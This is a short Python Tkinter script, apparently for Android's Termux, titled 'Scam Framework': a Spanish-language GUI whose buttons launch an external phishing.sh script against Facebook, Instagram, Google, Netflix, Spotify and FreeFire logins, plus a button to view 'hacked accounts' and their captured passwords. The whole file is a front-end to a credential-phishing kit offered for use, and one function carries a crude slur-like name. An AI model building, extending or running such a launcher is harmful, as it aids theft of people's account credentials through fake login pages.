#!/data/data/com.termux/files/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  index.py
#
#  Copyright 2021 Yisus7u7v <jesuspixel5@gmail.com>
#
#  This program is free software; you can redistribute it and/or modi>
#  it under the terms of the GNU General Public License as published >
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#

from tkinter import *

import subprocess

scam=Tk()

scam.title("Scam Framework")
scam.geometry("600x400")

def facebook():
    subprocess.Popen(['./phishing.sh', '--use', '-Facebook'])

def instagram():
     subprocess.Popen(['./phishing.sh', '--use', '-instagram'])

def google():
    subprocess.Popen(['./phishing.sh', '--use', '-google'])

def netflix():
    subprocess.Popen(['./phishing.sh', '--use', '-netflix']) 

def spotify():
    subprocess.Popen(['./phishing.sh', '--use', '-spotify']) 

def freegay():
    subprocess.Popen(['./phishing.sh', '--use', '-freefire'])

def savepasswords():
    subprocess.Popen(['./phishing.sh', '--ver', '-passwords'])

def help():
    subprocess.Popen(['termux-open', 'https://github.com/Yisus7u7/ScamGUI'])





Label(scam, text="Bienvenido a scam en GUI, selecciona la opcion a usar", fg="green").pack()

Button(scam, text="Facebook", bg="blue", fg="white", command=facebook).pack(ipadx=400)

Button(scam, text="Instagram", bg="pink", fg="white", command=instagram).pack(ipadx=400)

Button(scam, text="Google", bg="yellow", fg="blue", command=google).pack(ipadx=400)

Button(scam, text="Netflix", bg="red", fg="white", command=netflix).pack(ipadx=400)

Button(scam, text="Spotify", bg="green", fg="white", command=spotify).pack(ipadx=400)

Button(scam, text="FreeFire", bg="black", fg="white", command=freegay).pack(ipadx=400)

Button(scam, text="Ver cuentas Hackeadas", bg="red", fg="blue", command=savepasswords).pack(ipadx=400)

Button(scam, text="Como se usa?", fg="black", command=help).pack(ipadx=300)



scam.mainloop()


